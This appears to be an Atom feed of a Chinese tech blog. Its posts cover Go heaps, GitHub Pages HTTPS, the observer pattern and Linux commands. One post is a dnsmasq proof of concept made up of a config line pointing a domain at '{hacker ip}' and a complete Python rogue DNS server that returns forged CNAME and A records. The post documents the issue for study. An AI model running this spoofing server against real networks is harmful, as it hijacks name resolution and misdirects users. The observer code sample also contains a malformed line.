<code>j</code> 个元素，返回比较结果。这关系着 <code>heap</code> 生成的是最小堆还是最大堆。<br><strong>当 <code>i &lt; j</code> 且 <code>Less(i, j) == true</code> 时，获得最小堆。反之则是最大堆。</strong></p><p><code>Push</code> 方法把元素添加到尾部， <code>Pop</code> 方法把堆顶元素移出。</p><p>这里需要注意的是，如果自己另外实现堆方法，记住堆的内部存储是一个二叉树，第一个元素是堆顶，最后一个元素是堆尾。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">内部存储：[1,2,3,4,5]</span><br><span class="line">堆：</span><br><span class="line">         1</span><br><span class="line">       /   \</span><br><span class="line">      2     3</span><br><span class="line">     / \</span><br><span class="line">    4   5</span><br></pre></td></tr></table></figure><p>golang的堆接口会在实现好这些基本方法帮你自动维护堆的有序性。</p><p><code>func Init(h interface)</code><br>将一个乱序的堆进行排序，使之成为一个有效的堆</p><p><code>func Fix(h Interface, i int)</code><br>在修改第i个元素后，调用本函数修复堆，比删除第i个元素后插入新元素更有效率。</p><p><code>func Pop(h Interface) interface&#123;&#125;</code><br>向堆添加一个新元素</p><p><code>func Push(h Interface, x interface&#123;&#125;)</code><br>弹出并返回堆顶元素</p><p><code>func Remove(h Interface, i int) interface&#123;&#125;</code><br>删除堆中的第i个元素</p><ul><li>注意这里的Push&amp;Pop方法并不是我们自己实现的Push&amp;Pop，它会在我们实现的Push&amp;Pop基础上进行封装，确保可以仍然维护堆的性质。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;对golang标准库堆的深入分析与实践 ^.^&lt;br&gt;阅读须知：本文假设读者了解堆的数据结构，并明白堆排序的原理。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;堆排序（heapsort）&quot;&gt;&lt;a href=&quot;#堆排序（heapsort）</summary>
      
    
    
    
    
    <category term="golang" scheme="https://xchens.cn/tags/golang/"/>
    
    <category term="数据结构" scheme="https://xchens.cn/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>https on github page</title>
    <link href="https://xchens.cn/posts/37610144/"/>
    <id>https://xchens.cn/posts/37610144/</id>
    <published>2021-01-12T06:15:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>有些事太难了让人头疼，但有些事太简单了也让人害怕. </p></blockquote><h2 id="github-amp-自定义域名"><a href="#github-amp-自定义域名" class="headerlink" title="github &amp; 自定义域名"></a>github &amp; 自定义域名</h2><p>在 github page配置自定义域名出乎意料的简单，如下几步即可快速配置  </p><ul><li>设置域名的DNS解析，cname: username.github.io</li><li>在项目目录下放置一个<code>CNAME</code>文件，记录自定义域名</li><li>在 <code>setting</code> 中指定自定义域名</li></ul><p>github支持多种方式配置自定义域名，以上只是我自己实测过的其中一种，详情参考 <a href="https://docs.github.com/cn/free-pro-team@latest/github/working-with-github-pages/about-custom-domains-and-github-pages">官方文档：如何在github配置自定义域名</a></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>通过以上方式指定的自定义域名竟然是支持HTTPS的！！！<br>https的原理这里就不赘述了，总之是支持通过公私钥机制来帮助用户认证服务端的，但以上逻辑完全没有公私钥好不好。</p><p>难不成github替我签发了自定义域名的证书？？？</p><p>那么问题很明显，github page 它凭什么支持https？？</p><h2 id="同行怎么做的"><a href="#同行怎么做的" class="headerlink" title="同行怎么做的"></a>同行怎么做的</h2><p><a href="https://gitee.com/help/articles/4228#article-header4">码云：在gitee使用自定义域名</a><br>看完gitee的操作不由放下心来，人家是通过用户自行申请公私钥，然后上传的方式来提供https服务，一板一眼，令人舒适。</p><h2 id="揭秘"><a href="#揭秘" class="headerlink" title="揭秘"></a>揭秘</h2><blockquote><p>有钱能使鬼推磨   </p></blockquote><p>在<a href="https://github.blog/2018-05-01-github-pages-custom-domains-https/">github官方博客</a>上我找到了这样一句话：</p><blockquote><p>We have partnered with the certificate authority Let’s Encrypt on this project. As supporters of Let’s Encrypt’s mission to make the web more secure for everyone, we’ve officially become Silver-level sponsors of the initiative.<br>我们已经与证书颁发机构 Let’s Encrypt 合作了。 作为 Let’s Encrypt 的使命的支持者，该使命旨在为所有人提供更安全的网络，我们已正式成为该计划的银级赞助商。</p></blockquote><p>所以，github page 的 https 证书来历大概就能明白了，当用户配置了域名解析后，相当于向github证明了自己是该域名的owner，然后借助github的银级赞助商权限，直接向证书颁发机构申请了一套证书下来。</p><p>emm，所以说向github证明自己的效果等同于向证书颁发机构证明自己了 QaQ。</p><p>真是花里胡哨的操作，还是gitee好，不光能让用户感受到证书申请的流程，了解更多https相关知识，而且还费尽苦心把自定义域名功能放在收费区，让更多开发者明白开源不是白嫖。</p><p>（但认真的说，gitee page 提供的国内 cdn buff 确实值这个价，github 真的太慢太慢了）</p><p><br/><br/></p>]]></content>
    
    
    <summary type="html">关于 github page 自定义域名支持 https 的一些探索</summary>
    
    
    
    
    <category term="https" scheme="https://xchens.cn/tags/https/"/>
    
  </entry>
  
  <entry>
    <title>漫谈设计模式 2 - 状态模式</title>
    <link href="https://xchens.cn/posts/d2b0d310/"/>
    <id>https://xchens.cn/posts/d2b0d310/</id>
    <published>2020-10-13T03:43:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    
    <summary type="html">常见设计模式的介绍与剖析。深入原理，不能错过的经典设计模式之状态模式。</summary>
    
    
    
    
    <category term="code design" scheme="https://xchens.cn/tags/code-design/"/>
    
    <category term="设计模式" scheme="https://xchens.cn/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>漫谈设计模式 1 - 观察者模式</title>
    <link href="https://xchens.cn/posts/83eac405/"/>
    <id>https://xchens.cn/posts/83eac405/</id>
    <published>2020-10-10T10:33:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>观察者模式也称监听模式、发布/订阅模式、模型/视图模式、源/监听器模式、从属者模式等，是一种对象行为型模式。  </p><p>其原理是在对象间定义一种<code>一对多</code>的依赖关系，当这个对象状态发生改变时，所有依赖它的对象都会被通知并自动更新。<br>核心是在被观察者与观察者之间建立一种自动触发的关系。  </p><h2 id="模型-python示例"><a href="#模型-python示例" class="headerlink" title="模型 - python示例"></a>模型 - python示例</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引入 ABCMeta 和 abstractmethod 来定义抽象类和抽象方法</span></span><br><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Observer</span>(<span class="params">metaclass=ABCMeta</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;`观察者`的基类&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self, observable, <span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;各`观察者`各自实现此接口，等待被`被观察者`触发后执行相应动作&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Observable</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;`被观察者`的基类&quot;&quot;&quot;</span></span><br><span class="line">    def__ init__ (self):</span><br><span class="line">        self._observers = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addObserver</span>(<span class="params">self, observer</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;添加`观察者`&quot;&quot;&quot;</span></span><br><span class="line">        self._observers.append(observer)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeObserver</span>(<span class="params">self, observer</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;移除`观察者`&quot;&quot;&quot;</span></span><br><span class="line">        self._observers.remove(observer)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">notifyObservers</span>(<span class="params">self, <span class="built_in">object</span>=<span class="number">0</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;`被观察者`在事件发生时调用此方法来通知所有`观察者`&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> o <span class="keyword">in</span> self._observers:</span><br><span class="line">            o.update(self, <span class="built_in">object</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别实现`观察者`类实现Observer，`被观察者`类继承Observable</span></span><br><span class="line"><span class="comment"># `被观察者`实例调用基类的addObserver()方法来添加`观察者`实例</span></span><br><span class="line"><span class="comment"># 当`被观察者`实例运行时满足特定需求时，调用notifyObservers()方法触发激活所有`观察者`实例的update()方法</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><h3 id="推模型-拉模型"><a href="#推模型-拉模型" class="headerlink" title="推模型 拉模型"></a>推模型 拉模型</h3><p>观察者模式可以根据侧重功能分为推模型和拉模型。</p><p>推模型指在事件触发时<code>被观察者</code>向<code>观察者</code>推送主题的详细信息，而拉模型则是只推送少量信息，由<code>观察者</code>自行决定是否需要拉取更多数据信息。</p><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><ol><li>当多个对象的动作执行依赖于某个特定事件的发生   </li><li>当一个对象的更新需要关联更新多个对象   </li></ol><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p><strong>优点</strong></p><ul><li>降低了目标与观察者之间的耦合关系，两者之间是抽象耦合关系  </li><li>目标与观察者之间建立了一套触发机制  </li><li>支持广播通信  </li><li>符合“开闭原则”的要求  <blockquote><p>在面向对象编程领域中，开闭原则规定“软件中的对象（类，模块，函数等等）应该对于扩展是开放的，但是对于修改是封闭的”，这意味着一个实体是允许在不改变它的源代码的前提下变更它的行为。该特性在产品化的环境中是特别有价值的，在这种环境中，改变源代码需要代码审查，单元测试以及诸如此类的用以确保产品使用质量的过程。遵循这种原则的代码在扩展时并不发生改变，因此无需上述的过程。</p></blockquote></li></ul><p><strong>缺点</strong></p><ul><li>目标与观察者之间的依赖关系并没有完全解除，而且有可能出现循环引用  </li><li>当观察者对象很多时，通知的发布会花费很多时间，影响程序的效率  </li></ul><p><br/><br/><br/><br/><br/><br/><br/><br/></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">【非原创声明】本文内容参考以下来源，此处仅做记录分享，如有侵权可联系删除 </span><br><span class="line">  1. 《人人都懂设计模式：从生活中领悟设计模式（python实现）》  </span><br><span class="line">  2. 菜鸟教程</span><br><span class="line">  3. 维基百科</span><br><span class="line">  4. 其他看完后忘了在哪但又确实很有用的的博客文章</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">常见设计模式的介绍与剖析。深入原理，不能错过的经典设计模式之观察者模式（监听模式）。</summary>
    
    
    
    
    <category term="code design" scheme="https://xchens.cn/tags/code-design/"/>
    
    <category term="设计模式" scheme="https://xchens.cn/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>Arbitrary domain name hijacking caused by misconfiguration in dnsmasq</title>
    <link href="https://xchens.cn/posts/d8547337/"/>
    <id>https://xchens.cn/posts/d8547337/</id>
    <published>2020-09-09T08:50:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dnsmasq"><a href="#dnsmasq" class="headerlink" title="dnsmasq"></a>dnsmasq</h1><blockquote><p>Dnsmasq provides network infrastructure for small networks: DNS, DHCP, router advertisement and network boot. It is designed to be lightweight and have a small footprint, suitable for resource constrained routers and firewalls. It has also been widely used for tethering on smartphones and portable hotspots, and to support virtual networking in virtualisation frameworks. Supported platforms include Linux (with glibc and uclibc), Android, *BSD, and Mac OS X. Dnsmasq is included in most Linux distributions and the ports systems of FreeBSD, OpenBSD and NetBSD. Dnsmasq provides full IPv6 support.  </p></blockquote><p><a href="http://www.thekelleys.org.uk/dnsmasq/doc.html">dnsmasq homepage</a></p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><ol><li>add this config to <code>dnsmasq.conf</code> or <code>dnsmasq.d/poc.conf</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server=/a.net/&#123;hacker ip&#125;</span><br></pre></td></tr></table></figure>then restart the dnsmasq to activate this config.  </li></ol><ul><li>dnsmasq.conf is usually at /usr/local/etc/ if in mac os</li></ul><ol start="2"><li>run this code in the {hacker ip} - <code>poc.py</code></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> socket, AF_INET, SOCK_DGRAM</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dns</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># hdr</span></span><br><span class="line">        self.transactionID  = <span class="string">b&quot;\x00\x00&quot;</span> <span class="comment"># --</span></span><br><span class="line">        self.flags          = <span class="string">b&quot;\x81\x80&quot;</span></span><br><span class="line">        self.questionNum    = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line">        self.answerRR       = <span class="string">b&quot;\x00\x02&quot;</span></span><br><span class="line">        self.authorityRR    = <span class="string">b&quot;\x00\x00&quot;</span></span><br><span class="line">        self.additionalRR   = <span class="string">b&quot;\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># queries - only one we need</span></span><br><span class="line">        self.qname  = <span class="string">b&quot;\x01a\x03net\x00&quot;</span> <span class="comment"># -- 0x0c</span></span><br><span class="line">        self.qtype  = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line">        self.qclass = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># answers - CNAME</span></span><br><span class="line">        self.cnameName    = <span class="string">b&quot;\xc0\x0c&quot;</span></span><br><span class="line">        self.cnameType    = <span class="string">b&quot;\x00\x05&quot;</span></span><br><span class="line">        self.cnameClass   = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line">        self.cnameTtl     = <span class="string">b&quot;\x00\x00\x00\x20&quot;</span>  <span class="comment"># domain hijack duration</span></span><br><span class="line">        self.cnameDataLen = <span class="string">b&quot;\x00\x0d&quot;</span> <span class="comment"># --</span></span><br><span class="line">        self.cnameTarget  = <span class="string">b&quot;\x07example\x03net\x00&quot;</span>  <span class="comment"># --</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># answers - A</span></span><br><span class="line">        self.aName    = <span class="string">b&quot;\xc0\x19&quot;</span>  <span class="comment"># --</span></span><br><span class="line">        self.aType    = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line">        self.aCLass   = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line">        self.aTtl     = <span class="string">b&quot;\x00\x00\x00\x20&quot;</span>  <span class="comment"># domain hijack duration</span></span><br><span class="line">        self.aDataLen = <span class="string">b&quot;\x00\x04&quot;</span></span><br><span class="line">        self.aRecord  = <span class="string">b&quot;\x01\x02\x03\x04&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_setReply</span>(<span class="params">self, query: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        self.transactionID = query[:<span class="number">2</span>]</span><br><span class="line">        i = <span class="number">0x0c</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(query):</span><br><span class="line">            <span class="keyword">if</span> query[i] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        self.qname = query[<span class="number">0x0c</span>:i+<span class="number">1</span>]</span><br><span class="line">        self.aName = ((<span class="built_in">len</span>(self.qname) + <span class="number">28</span>) | <span class="number">0xc000</span>).to_bytes(<span class="number">2</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">self, query: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;build dns response to query&quot;&quot;&quot;</span></span><br><span class="line">        self._setReply(query)</span><br><span class="line">        <span class="comment"># build</span></span><br><span class="line">        hdr = self.transactionID + self.flags + self.questionNum + self.answerRR + self.authorityRR + self.additionalRR</span><br><span class="line">        query = self.qname + self.qtype + self.qclass</span><br><span class="line">        answerCNAME = self.cnameName + self.cnameType + self.cnameClass + self.cnameTtl + self.cnameDataLen + self.cnameTarget</span><br><span class="line">        answerA = self.aName + self.aType + self.aCLass + self.aTtl + self.aDataLen + self.aRecord</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hdr + query + answerCNAME + answerA  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dns_server</span>(<span class="params">port: <span class="built_in">int</span></span>):</span></span><br><span class="line">    address = (<span class="string">&#x27;&#x27;</span>, port)</span><br><span class="line">    sock = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">    sock.bind(address)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Listen UDP on: &quot;</span>, port)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        msg, addr = sock.recvfrom(<span class="number">8192</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;recv from:&quot;</span>, addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(msg) &gt; <span class="number">20</span>:</span><br><span class="line">            d = dns()</span><br><span class="line">            data = d.build(msg)</span><br><span class="line">            sock.sendto(data, addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    port = <span class="number">53</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>].isdigit():</span><br><span class="line">        port = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">    dns_server(port)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>check hijack</li></ol><p><img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/dnsmasq_poc.jpeg" alt="poc"></p>]]></content>
    
    
    <summary type="html">Arbitrary domain name hijacking caused by misconfiguration in dnsmasq</summary>
    
    
    
    
    <category term="dns" scheme="https://xchens.cn/tags/dns/"/>
    
    <category term="dnsmasq" scheme="https://xchens.cn/tags/dnsmasq/"/>
    
  </entry>
  
  <entry>
    <title>linux常用命令</title>
    <link href="https://xchens.cn/posts/fe4ef317/"/>
    <id>https://xchens.cn/posts/fe4ef317/</id>
    <published>2018-12-26T08:00:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><p>本文尽可能的收集了常用命令及其常用参数，不足之处还望指正。</p><h2 id="about-w"><a href="#about-w" class="headerlink" title="about w"></a>about w</h2><p>一些特别的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">whatis   <span class="comment"># 简单查看命令的作用。如 whatis ls</span></span><br><span class="line">whereis  <span class="comment"># 查看文件的位置，当安装了同一程序的多个版本时特别有用。如 whereis cat</span></span><br><span class="line"><span class="built_in">which</span>    <span class="comment"># 查看指定命令的位置。如 which ps</span></span><br><span class="line">who      <span class="comment"># 显示系统中有哪些使用者正在上面</span></span><br><span class="line">         <span class="comment"># who     # 查看当前登录系统的用户</span></span><br><span class="line">         <span class="comment"># who -H  # 给显示的列表增加顶部标题栏</span></span><br><span class="line">whoami   <span class="comment"># 查看当前EUID关联的用户名。可简单理解为查看当前用户名</span></span><br><span class="line">whois    <span class="comment"># 联网查询whois信息。如 whois example.com, whois 127.0.0.1</span></span><br><span class="line"><span class="built_in">pwd</span>      <span class="comment"># 查看当前所在的路径位置</span></span><br></pre></td></tr></table></figure><h2 id="zipinfo-zip-unzip-tar-gzip-gunzip-bzip2-bunzip2"><a href="#zipinfo-zip-unzip-tar-gzip-gunzip-bzip2-bunzip2" class="headerlink" title="zipinfo-zip-unzip/tar/gzip-gunzip/bzip2-bunzip2"></a>zipinfo-zip-unzip/tar/gzip-gunzip/bzip2-bunzip2</h2><p>文件压缩与解压 zip,tar,gz,bz2</p><blockquote><p>zip</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">zip -r a.zip /path/to/dir   <span class="comment"># 将dir目录下的所有文件与目录压缩为 a.zip</span></span><br><span class="line">zip a.zip s1.file s2.file   <span class="comment"># 将s1.file,s2.file合并压缩为 a.zip</span></span><br><span class="line">zip -d a.zip a.c            <span class="comment"># 从压缩文件 a.zip 中删除文件 a.c</span></span><br><span class="line">zip -z a.zip                <span class="comment"># 给a.zip添加注释（在随后的交互式输入中输入注释）</span></span><br><span class="line">    -q                      <span class="comment"># 压缩时不显示过程提示。静默模式(quiet)</span></span><br><span class="line">    -v                      <span class="comment"># 显示更详细的压缩信息</span></span><br><span class="line"></span><br><span class="line">zipinfo t.zip          <span class="comment"># 显示t.zip的信息</span></span><br><span class="line">        -v             <span class="comment"># 显示目标zip更详尽的信息</span></span><br><span class="line">        -z             <span class="comment"># 如果目标zip含有注释，则显示注释</span></span><br><span class="line"></span><br><span class="line">unzip -v t.zip         <span class="comment"># 查看t.zip的内容信息，但是不解压（与zipinfo查看的内容不完全相同）</span></span><br><span class="line">unzip -l t.zip         <span class="comment"># 查看t.zip内的文件，不解压</span></span><br><span class="line">unzip t.zip            <span class="comment"># 解压</span></span><br><span class="line">unzip -o t.zip         <span class="comment"># 解压，遇到相同文件名直接覆盖，不询问</span></span><br><span class="line">unzip -n t.zip         <span class="comment"># 解压，遇到相同文件名直接跳过，不询问</span></span><br></pre></td></tr></table></figure><blockquote><p>tar</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf t.tar.gz a.c b.c  <span class="comment"># 打包a.c,b.c到t.tar.gz</span></span><br><span class="line">tar -tzvf t.tar.gz          <span class="comment"># 显示t.tar.gz的内容</span></span><br><span class="line">tar -xzvf t.tar.gz          <span class="comment"># 解包t.tar.gz</span></span><br></pre></td></tr></table></figure><blockquote><p>gz</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gzip ./*      <span class="comment"># 分别压缩当前目录所有文件</span></span><br><span class="line">gzip -d ./*   <span class="comment"># 分别解压当前所有文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gunzip 只是 gzip 的一个硬链接</span></span><br></pre></td></tr></table></figure><blockquote><p>bz2</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bzip2 ./*      <span class="comment"># 分别压缩当前目录所有文件</span></span><br><span class="line">bzip2 -d ./*   <span class="comment"># 分别解压当前所有文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bunzip2 是 bzip2 的软链接（符号链接）</span></span><br></pre></td></tr></table></figure><h2 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h2><p>查看文件或目录信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ls -l         <span class="comment"># 查看当前目录的文件及子目录（详细信息）</span></span><br><span class="line">ls -a         <span class="comment"># 查看...（包括隐藏文件与与隐藏文件夹）</span></span><br><span class="line">ls -lh        <span class="comment"># 查看...（将信息以人类可读的直观方式显示，单独使用-h效果不明显）</span></span><br><span class="line">ls -R         <span class="comment"># 递归遍历子文件夹</span></span><br><span class="line">ls -d /dir    <span class="comment"># 列出指定目录本身，而不是其中的内容，最好结合-l</span></span><br><span class="line">ls -lt        <span class="comment"># 列出文件与目录详细信息，输出按时间排序</span></span><br><span class="line">ls -lrt       <span class="comment"># 列出文件与目录详细信息，输出按时间反向排序</span></span><br><span class="line">ls -S         <span class="comment"># 将文件或目录从大到小排序后输出</span></span><br><span class="line">ls --sort=size / ls --sort=time  <span class="comment"># 即 ls -S/ls -t</span></span><br></pre></td></tr></table></figure><h2 id="cat-head-tail"><a href="#cat-head-tail" class="headerlink" title="cat/head/tail"></a>cat/head/tail</h2><p>查看文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cat file       <span class="comment"># 查看文件内容</span></span><br><span class="line">cat / cat -    <span class="comment"># 无参数或-表示cat接受标准输入()</span></span><br><span class="line">cat -n file    <span class="comment"># 查看文件内容的同时显示行号</span></span><br><span class="line">    -E / --show-ends  <span class="comment"># 